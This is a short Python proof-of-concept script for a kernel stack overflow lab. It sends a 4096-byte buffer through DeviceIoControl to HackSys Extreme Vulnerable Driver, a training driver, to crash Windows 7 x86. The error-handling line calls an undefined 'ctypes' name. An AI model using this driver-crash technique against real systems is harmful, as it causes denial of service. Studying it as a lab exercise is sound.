from ctypes import *
from ctypes.wintypes import *

# Title : HEVD x86 Stack Overflow BSOD
# Platform: Windows 7 x86
# Author: Osanda Malith Jayathissa (@OsandaMalith)
# Website: https://osandamalith.com

kernel32 = windll.kernel32

def main():
	lpBytesReturned = c_ulong()
	hDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
	
	if not hDevice or hDevice == -1:
		print "[!] Failed to get a handle to the driver " + str(ctypes.GetLastError())
		return -1

	buf = "\x41" * (1024 * 4) 

	bufSize  = len(buf)
	bufPtr = id(buf) + 20
	kernel32.DeviceIoControl(hDevice, 0x222003, bufPtr, bufSize, None, 0,byref(lpBytesReturned), None)
		
if __name__ == '__main__':
	main()
# EOF
